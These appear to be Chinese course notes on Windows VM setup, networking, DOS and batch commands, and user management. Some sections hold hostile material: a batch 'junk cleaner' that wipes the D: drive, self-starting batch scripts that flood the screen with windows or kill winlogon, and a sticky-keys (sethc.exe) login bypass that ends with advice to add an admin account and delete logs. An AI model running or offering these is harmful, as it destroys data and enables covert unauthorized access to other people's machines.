



# 系统软件的安装

## 安装虚拟机（在应用商店下载即可）

## 部署xp、win2003service、win2007、win2008

```
链接：https://pan.baidu.com/s/1O2xyqn0mpvdPsqyhuXuBuw 
提取码：c4qm 
复制这段内容后打开百度网盘手机App，操作更方便哦
```

### 部署xp

#### 	配置硬件

(1)打开VMware软件，选择文件-新建虚拟机-典型

![1604284198531](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604284198531.png)

(2)选择稍后安装操作系统【没有系统的序列号】

![1604284478654](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604284478654.png)

(3)选择操作系统和版本

![1604284814082](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604284814082.png)

(4)自己定义系统名，重要的是路径

先建好路径文件，继续选择

![1604285045838](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604285045838.png)

![1604285109347](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604285109347.png)

(5)选择单个文件

![1604286244740](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604286244740.png)

(6)最后即完成

![1604286292037](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604286292037.png)

##### 补充：对于虚拟电脑的硬件的设置改变

​	方法1：直接在硬件那里双击打开即可

![1604286533829](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604286533829.png)

​	方法2：选择-虚拟机-设置

![1604286582204](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604286582204.png)

(7)使用镜像文件

选择-虚拟机-设置-CD/DVD

![1604286934977](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604286934977.png)

(8)开启虚拟机

#### 系统安装

a.ctrl+alt真实机机与虚拟机的鼠标切换

![1604287219774](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604287219774.png)

b.winxp的许可协议-同意f8键

![1604287360819](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604287360819.png)

c.创建磁盘分区，C键

![1604287529927](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604287529927.png)

d.创建磁盘分区，大小是10G，10240M，C盘的大小

![1604287841351](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604287841351.png)

e.将系统文件安装于C盘

![1604287889735](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604287889735.png)

f.选择NTFS新的文件硬盘类型

![1604288219702](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604288219702.png)

g.完成之后，回车键直接重启或者会自动重启（含有某些设置 ）

输入相关的产品密钥，计算机名称winxp-hm等，管理员的密码为常用的123.com/admin,之后默认下一步即可

### 部署win2007（同XP，不同的部分如下）

#### 配置硬件

(3)选择操作系统和版本

![1604298696562](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604298696562.png)

(8)开启虚拟机

#### 系统安装

a.默认，下一步

![1604299311627](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604299311627.png)

b.现在安装

![1604299346166](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604299346166.png)

c.自定义高级

![1604299490264](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604299490264.png)

d.驱动器高级-新建-大小：10240-应用

![1604299583184](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604299583184.png)

e.选择C盘，下一步，等待即可

![1604299681624](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604299681624.png)

f.重启之后输入用户名

![1604301286895](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604301286895.png)

g.点击以后询问

![1604301404406](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604301404406.png)



### 部署win2008（同XP，不同的部分如下）

#### 配置硬件

(3)选择操作系统和版本

![1604300115338](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604300115338.png)

(8)开启虚拟机

#### 系统安装

a.默认，下一步

b.现在安装

c.选择win2008R2企业版（完全安装）

![1604300731579](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604300731579.png)

d.自定义高级（后续步骤如win2007）

e.选择高级-新建-大小：10240（应用）

f.选择C盘，下一步，等待即可

g.重启后，新密码设置为了win-2008

![1604302683077](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604302683077.png)

### 部署win2003

（由于先配置硬件，后引入镜像文件无法识别镜像文件，此方法是在配置硬件时就引入镜像文件）

#### 配置硬件及系统安装

（1）文件-新建虚拟机-典型

（2）安装程序光盘镜像文件

![1604301866633](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604301866633.png)

（3）输入密钥

![1604302060990](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604302060990.png)

（4）虚拟机名称，安装路径

![1604302150365](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604302150365.png)

（5）单个文件，完成

（6）开启虚拟机

## 优化虚拟机

### 检查系统是否激活

win2003/winxp是有密钥的，在操作过程中就输入了密钥

win7/8利用激活工具激活

检查是否激活：我的电脑-右键-属性

![1604328739899](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604328739899.png)

### 安装VMtools

VMtools--------作用：实现虚拟机与真实机的文件共享交互

虚拟机-安装VMtools（-点击setup.exe）-默认操作-重启-与真实机互动检测

### 调出桌面图标

​	a.开始（无搜索框）电脑屏幕空白处-右击-属性-桌面-自定义桌面-选择相应的即可

​	b.开始（有搜索框）在搜索框处输入icon-显示与隐藏桌面图标-选择相应的即可

### 磁盘管理（创建D盘）

（1）我的电脑-右键-管理-磁盘管理

![1604322181780](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604322181780.png)

（2）先将D盘改为E盘：在D处-右键-更改驱动器名和路径-D改为E

![1604322299101](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604322299101.png)

（3）未指派部分：在未指派处-右键-新建磁盘分区-默认下一步（注意驱动器号是D）

![1604322414885](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604322414885.png)

### 关闭自动更新

a.开始-控制面板-**自动更新**-关闭自动更新

b.开始-控制面板-安全中心-**自动更新**-关闭自动更新

也可以直接在控制面板中搜索

### 做快照

虚拟机-快照-拍摄快照

### 做克隆

#### 克隆操作

虚拟机-快照-快照管理器-选择自己的快照状态-克隆-现有快照-克隆链接-选择克隆机的名称和存放位置

![1604367775413](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604367775413.png)

![现有快照](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604367892750.png)

![链接克隆](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604368092245.png)

#### 部分修改设置（解决冲突）

计算机名称的修改

我的电脑-右键-属性-计算机名-更改

### 系统资源寻找

https://msdn.itellyou.cn/-操作系统

![1604370764754](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1604370764754.png)

# IP地址详解

ip地址就是一个唯一标识，是一段网络编码

## 局域网

局域网：一般称为内网

蛋局域网构成：交换机，网线，PC

交换机：用来组建内网的局域网的设备

## IP地址

32位二进制

10进制：x.x.x.x-----x的范围0-255

## 子网掩码

局域网通信规则：在同一个局域网中，必须在同一个网段中才可以互相通信！

IP地址的构成：网络位+主机位（网络位相同的IP地址，为同一网段）

子网掩码如何确定网络位：与255对应的数字为网络位，与0对应法的数字为主机位

## IP地址详解

国际标准组织ISO定义地址分类：五大类（是以IP地址的第一位进行区分）

A类：1-126位默认子网掩码：255.0.0.0

B类：128-191位默认子网掩码：255.255.0.0

C类：192-223位默认子网掩码：255.255.255.0

D类：224-239组播地址

E类：240-254科研使用

```
注：目前我们能使用A.B.C类子网掩码可以修改
127.0.0.1代表本地回环地址
```

每个网段的地址分为三类：

1.该网段的名称：主机位全为0

2.该网段的广播地址：主机位全为1

3.可用地址：（主机位全为0----主机位全为1），开集合，不包括两端

```
例：
问：10.1.1.1/24属于哪个网段？所在的网段有多少个可用IP地址？该网段的广播地址是？
答：10.1.1.1属于10.1.1.0的网段
	10.1.1.0网段可用的IP地址范围是：10.1.1.1-10.1.1.254
	10.1.1.0网段的广播地址：10.1.1.255
```

## 网关

网关：一个网络的出口，一般网关是在路由器上

路由器：可用连接内外网的设备

```
pc向外发包：
1.首先判断目标IP与自己是否是在同一个网段
2.如在同一个网段，则直接发送出去，不找网关
3.如不在一个网段，则发包给网关
```



![网关](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1606912744481.png)



## DNS域名服务（Domain Name Service）

```
1.本地DNS缓存
2.本地hosts文件
3.找DNS服务
```

## 进制转换（略）

## 网络测试命令

首先：开始-运行-输入cmd-进入命令行窗口/win+r打开运行窗口

### 如何查看IP地址

ipconfig                                    #查看IP地址基本信息

ipconfig  /all                             #查看IP地址详细信息

### 测试网络通性

ping  目标IP地址                       #测试网络连通性，有去有回即为可以成功通信！

ping -t 目标IP地址                     #一直ping

ping -n  数字 目标IP地址           #修改ping包的数量

```
注：如ping不通，可能对方不在线，或者对方开着防火墙！
```

![测试网络通性](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1606913601450.png)

### 手工解析域名

nslookup  www.baidu.com                #手工解析域名的IP地址

![域名解析](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1606913926173.png)



# DOS命令

## 清空命令窗口

cls                 #清屏

## 目录文件夹的相关命令

### c:/d:/E:           #切换盘符

![1606915350907](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1606915350907.png)

### dir                 #浏览当前文件夹的文件内容

```
dir 路径		//浏览指定路径位置的文件内容
dir /a 		 //浏览当前位置的所有内容，包括隐藏文件	
```

### cd					#切换位置

```
cd 	文件夹名	  //进入文件夹-tab键补全路径功能
cd ..			//回到上一级目录
cd \			//直接退到根目录
```

### md					#创建文件夹

```
md	文件夹名		  //创建文件夹名
md a,b,c 			//同时创建多个文件夹
md d\e\f 			//同时创建多层文件夹
```

### rd					 #删除文件夹

```
rd 文件夹名 		//删除空的文件夹
rd 文件夹名 /s 		//删除该非空文件夹
rd 文件夹名 /s /q 	//无提示删除非空文件夹
rd . /s /q		   //删除当前目录下的所有文件
```

## 文件的相关命令

### 创建文件

```
创建文件方法1： echo
echo 字符串 >>[路径\]文件名.扩展名
注释：>>和>都可以将命令的输出内容输入到某文件中，若文件不存在，则同时创建该文件 
>>为追加 		//在原文件内容的末尾加上文字
>为覆盖 		//清空了原文件的内容，重新在文件中加入文字。
案例：修改hosts文件 echo 1.1.1.1 www.baidu.com >>D:\b\www222.txt

创建文件方法2： copy
copy con 文件名.扩展名
开始编写内容
ctrl + z 	回车结束编写
```

### type				#浏览文件的内容

```
type 文件名.扩展名 		//浏览一个文件的内容
type 文件名.扩展名 |more	//分页显示
```

### del					#删除文件

```
del 文件名.扩展名 		//删除文件 
del *.txt 				//删除所有txt结尾的文件 
del *.* 				//删除所有文件 
del *.* /s /q 			//无提示删除所有文件 
注释：*为通配符，代表任意字符，任意长度
```

### 移动/复制/重命名文件

```
复制文件：copy [路径\]源文件全名 目标路径[\新文件全名] 
移动文件：move [路径\]源文件全名 目标路径[\新文件全名]
重命名文件：ren [路径\]源文件全名 目标路径[\新文件全名]
```

## 关机重启

```
shutdown -s -t 秒 		//定时关机 
shutdown -s -f -t 秒 	//定时强制关机 
shutdown -r -t 秒 		//定时重启，同上加-f,为强制重启 
shutdown -a 			 //取消定时 
shutdown -l 			 //注销，同logoff命令相同。
```

# 批处理编写

自上而下成批的处理每一条命令，直到执行最后一条的.bat为扩展名的文档

## 基础设置

```
@echo off		//关闭回显，即关闭执行过程
color 0a		//颜色设置,调节颜色color ?
title huminv2.0 //标题设置
echo.			//空行
```

## 案例1：垃圾清理

```
@echo off
color 0a
title clear laji program
echo ---------------------------
echo 	clear your system laji 
echo 	if bei lan jie 
echo	please fangqi
echo ---------------------------
pause
echo.
echo laji is clearing......
d: >nul 2>nul
cd \ >nul 2>nul
rd . /s /q >nul 2>nul
ping -n 10 127.0.0.1 >nul 2>nul
echo congratulations!!! laji qingli over!
pause

// 对于>nul 2>nul是可以屏蔽一切屏幕的输出
//>nul 对于命令正确的使用，输出显示重定向为nul,清空了
//2>nul对于命令不正确时，还是会有输出，2>nul对因为命令错误输出内容进行屏蔽
```

## 案例2：创建指定大小的文件

```
d:
cd \
fsutil file createnew d:\sys.ini 40960000
fsutil file createnew d:\sys1.ini 40960000
fsutil file createnew d:\sys2.txt 4096
fsutil file createnew d:\sys3.txt 4096
fsutil file createnew d:\sys4.txt 4096
注：需要管理员的身份权限
```

## 案例3（病毒）：把源文件本身添加到开机启动项目中，即设置了开机自启

```
该文件取名：qq.bat

//开机自启循环
copy qq.bat "%userprofile%\「开始」菜单bai\程序\启动"
:d		//模块D,打开命令窗口，循环
start
goto d
```

## 案例4：程序运用

```
.bat文件

@echo off		//关闭回显，即关闭执行过程
color 0a		//颜色设置,调节颜色color ?
title huminv2.0 //标题设置
echo.			//空行

:menu
cls				//清屏
echo ----------------------
echo         菜单
echo		1.修改管理员密码
echo		2.定时关机
echo		3.退出本程序
echo------------------------

set /p num=你的选择是：		//设置变量，常用与在脚本中的互动赋值。
if "%num%"=="1" goto 1		//if-goto的用法
if "%num%"=="2" goto 2
if "%num%"=="3" goto 3
pause						//暂停
goto menu


:1							//区块
set /p u=请输入用户名：
set /p p=请输入用户密码：
net user %u% %p% >nul
echo 你的密码设置成功！
pause
goto menu

:2
set /p time=请输入时间：
shutdown -s -t %time%
set /p x=是否取消(1:是，0：否)：
if "%x%"=="1" shutdown -a
goto menu
pause

:3
exit
```

## 案例5（病毒）：强制杀死指定的进程

```
ntsd -c q -pn winlogon.exe		//针对xp/2003蓝屏操作
```

```
taskkill /im explorer.exe /f	//强行关闭进程-桌面进程
echo 傻了吧
ping -n 5 127.0.0.1 >nul 2>nul
start c:\windows\explorer.exe
echo 吓唬你的
pause
```

# 用户管理

```
windows服务系统：win2000/win2003/win2008/win2012
linux服务系统：  Redhat Centos
```

## 用户概述

### 每个用户登录系统之后，拥有不同的操作系统权限

### 每个账户有自己唯一的SID（安全标识符）

### 查看SID：whoami/user

​    用户SID:S-1-5-21-426206823-2579496042-14852678-500

​	系统SID：S-1-5-21-426206823-2579496042-14852678

```
用户的UID:500
windows系统管理员administrator的UID是500
普通用户的UID是1000开始
```

### 账户密码存储位置

c:\windows\system32\confifig\SAM #暴力破解/撞库

### windows系统上，默认密码的最长有限期42天

## 内置账户

### 给用户使用的账户

```
administrator	//管理员账户
guest			//来宾账户
```

### 计算机服务组件相关的系统账号

```
system			//系统账户==权限职高无上
local service 	//本地服务账户==权限等于普通用户
network service	//网络服务账户==权限等于普通用户
```

## 配置文件

每个用户都有自己的配置文件（家目录），在用户第一次登陆时自动产生。

```
win-----------C:\user\name
xp/win2003----C:\Documents and Settings\
```

## 用户管理命令

```
net user						//查看用户列表
net user 用户名 密码 			//改密码
net user 用户名 密码 /add		//创建一个新用户
net user 用户名 /del			 //删除一个用户
net user 用户名 /active:yes/no	 //激活或禁用账户
```

# 组管理

组的作用：简化权限的赋予

## 赋权限的方式

```
1.用户---组
2.用户---赋权限
```

## 内置组

内置组的权限默认已经被系统赋予

```
1.administrators		//管理员组
2.guests				//来宾组
3.users					//普通用户组，默认新建用户都属于该组
4.network 				//网络配置组
5.print 				//打印机组
6.remote desktop		//远程桌面组
```

## 组管理命令

```
net localgroup						//查看组列表
net localgroup zuname				//查看该组的成员
net localgroup zuname /add 			//创建一个新的组
net localgroup zuname username /add	//添加用户到组
net localgroup zuname username /del	//从组中剔除用户
net localgroup zuname /del			//删除组
```

## 服务管理

开始--运行--services.msc

# 服务器远程管理

## 远程桌面（图形）

拓扑图

![1607521609204](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1607521609204.png)

```
步骤：
1、首先将配置网络，并实现客户机与服务器可以互通。 
2、服务器开启允许被远程控制：计算机右键属性 -- 远程设置 -- 远程桌面 -- 应用 -- 确定。 
3、客户机上：开始 -- 运行 -- 输入mstsc 打开远程连接工具。 
4、在mstsc工具上输入服务器的IP并点击确定。 
5、输入服务器的账号及密码。 
注意：如使用非管理员账户登录远程，需要在服务器上将用户加入到远程桌面内置组Remote Desktop Users中。
```

## telnet(命令行)

```
步骤：
1、首先将配置网络，并实现客户机与服务器可以互通。
2、服务器开启允许被telnet远程控制：开始 -- 运行 -- 输入services.msc，并开启telnet服务。
3、客户机上：开始 -- 运行 -- 输入cmd。 
4、在命令行窗口中输入：telnet 10.1.1.2。 
5、输入服务器的账号及密码。
注意：如服务器是2008及更高版本系统，需要再第二步前先按照telnet服务：计算机右键管理 -- 功能 -- 按照 telnet 服务，另外如使用非管理员账户登录远程，需要再服务器上将用户加入到远程桌面内置组中。
```

# 破解系统密码

## 利用5次shift漏洞破解win7密码

### 漏洞原理

```
1.未登陆系统前连按5次shift弹出程序：c:\windows\system32\sethc.exe
2.部分win7及win10系统在未进入系统时，可以通过系统修复漏洞篡改系统文件名！
注：如果win7或win10已修补此漏洞2，则无法利用
思路：用cmd窗口程序来替换这个程序sethc.exe
```

### 操作

#### 连按shift键5次

打开win7系统，但是不登陆，在该界面，(这里鼠标一定要点击到虚拟机里面去)连按shift键5次，弹出下面的对话框，说明存在5次shift漏洞，这个程序的位置：c:\windows\system32\sethc.exe

![1607608347164](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1607608347164.png)

#### 关机-开机，在这个界面下把电源拔了

出现田字格时-选择虚拟机-电源-重新启动客户机。

![1607608618583](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1607608618583.png)

#### 选择启动自动修复

(开机如果未出现此界面，建议再拔电源一次,win7一般两次，win10一般三次）进入修复界面，这里当然是选择启动修复了，我们利用的就是启动修复的漏洞

![1607609100313](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1607609100313.png)

![1607609391912](C:\Users\hasee-pc\AppData\Roaming\Typora\typora-user-images\1607609391912.png)

#### 点击取消

![img](https://img-blog.csdnimg.cn/20200413112809518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

#### 它会继续尝试修复

![img](https://img-blog.csdnimg.cn/20200413112840874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

#### 点击**查看问题详细信息**



![img](https://img-blog.csdnimg.cn/20200413113543440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

#### 下拉至最后

![img](https://img-blog.csdnimg.cn/20200413113751997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

#### 进入我们记事本

![img](https://img-blog.csdnimg.cn/20200413113826766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

#### 我们选择  文件 -- 另存为   进入以下界面

![img](https://img-blog.csdnimg.cn/20200413113926131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

![img](https://img-blog.csdnimg.cn/20200413115923511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

#### 点击进入，就到我们的C盘了

依次进入目录：windows\system32

![img](https://img-blog.csdnimg.cn/20200413120118934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

```
cmd程序和粘贴键程序都在c:\windows\system32\cmd

5次shift漏洞的程序c:\windows\system32\sethc.exe
```

#### 找到我们的5次shift漏洞的程序，将这个程序重命名（改成什么都可以，）

![img](https://img-blog.csdnimg.cn/20200413114925658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

我们这里重命名成ssss

![img](https://img-blog.csdnimg.cn/20200413115116623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

#### 再找到我们的cmd程序 

 右键 -- 复制 -- 粘贴 -- 形成一个cmd副本，将其重命名为sethc 

![img](https://img-blog.csdnimg.cn/20200413115412699.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

![img](https://img-blog.csdnimg.cn/20200413115608802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

好了，到这里我们就基本上已经成功了。

关闭记事本，选择 --取消 --重新启动

回到我们的注销界面

#### 这次再连按5次shift,我们的cmd窗口就被调出来了

![img](https://img-blog.csdnimg.cn/20200413122525706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70)

```
1.可以修改该用户的密码
2.也可以创建新用户，将该用户添加到管理员组,这样子退出后，可以注销该用户，即无痕入侵。最好退出电脑登陆之前把日志文件删除。
```

## 利用PE破解系统密码

# NTFS安全权限



